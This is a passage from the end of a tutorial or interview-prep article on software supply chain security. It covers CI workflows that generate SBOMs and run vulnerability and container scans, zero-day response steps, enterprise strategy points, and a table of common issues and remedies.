        uses: actions/upload-artifact@v3
        with:
          name: sbom
          path: sbom.cdx.json

  # Stage 3: Vulnerability Scanning
  vulnerability-scan:
    needs: generate-sbom
    runs-on: ubuntu-latest
    steps:
      - name: Download SBOM
        uses: actions/download-artifact@v3
        with:
          name: sbom

      - name: Scan with Grype
        uses: anchore/scan-action@v3
        with:
          sbom: sbom.cdx.json
          fail-build: true
          severity-cutoff: high

  # Stage 4: Container Scanning
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:test .

      - name: Scan container
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:test
          exit-code: 1
          severity: CRITICAL,HIGH
```

**Q5: How to respond to a newly discovered zero-day vulnerability (like Log4Shell)?**

```
Answer Key Points:

1. Rapid Identification (within 30 minutes):
   - Query affected components using SBOM
   - Identify all applications using that component
   - Determine direct and transitive dependencies

2. Risk Assessment (within 1 hour):
   - Assess if vulnerability is exploitable
   - Check for signs of active exploitation
   - Determine business impact

3. Temporary Mitigation (within 2 hours):
   - Apply configuration-level mitigations
   - Update WAF/firewall rules
   - Consider temporarily taking critical systems offline

4. Fix Deployment (within 24 hours):
   - Test updated dependency versions
   - Gradually deploy to production
   - Monitor for anomalous behavior

5. Post-Incident Review:
   - Document complete timeline
   - Update incident response process
   - Improve SBOM coverage
```

### Security Strategy Design Questions

**Q6: Design an enterprise-level supply chain security strategy**

```
Answer Key Points:

1. Dependency Management Strategy:
   - Use private package repository mirrors
   - Establish approved dependency whitelist
   - Regularly review and update dependencies
   - Lock dependency versions

2. Build Security:
   - Isolated build environments
   - Reproducible build processes
   - Build artifact signing
   - Build log auditing

3. Vendor Assessment:
   - Evaluate third-party component security
   - Check maintenance status and community activity
   - Review security history

4. Continuous Monitoring:
   - Automated vulnerability scanning
   - Real-time security alerts
   - Regular security reports

5. Incident Response:
   - Predefined response processes
   - Automated impact analysis
   - Rapid remediation mechanisms
```

### Common Security Issues and Solutions

| Issue Type | Risk Level | Solution |
|------------|------------|----------|
| Unlocked dependency versions | High | Use lock files, pin version numbers |
| Missing SBOM | Medium | Integrate SBOM generation into CI/CD |
| Unverified package signatures | High | Enable package signature verification |
| Outdated dependencies | Medium | Configure auto-updates and regular reviews |
| Private package exposure | High | Use namespaces and private repositories |
| Unisolated build system | Critical | Use isolated build environments |
| Missing vulnerability scanning | High | Integrate multiple scanning tools |
| No incident response plan | Medium | Develop and practice response processes |

## Summary

Software supply chain security is a complex multi-layered security domain requiring protection throughout the entire process from development, build, distribution to runtime. Core principles include:

1. **Visibility**: Use SBOM to understand complete software composition and track all dependencies
2. **Verification**: Validate all component origins through signing and integrity checks
3. **Automation**: Integrate security checks into CI/CD workflows for continuous monitoring
4. **Minimization**: Only use necessary dependencies to reduce attack surface
5. **Response Preparedness**: Establish comprehensive incident response processes to respond quickly to security events

By implementing the best practices introduced in this article, you can significantly improve software supply chain security and effectively defend against various supply chain attacks. Remember, supply chain security is not a one-time effort but a process requiring continuous investment and improvement.
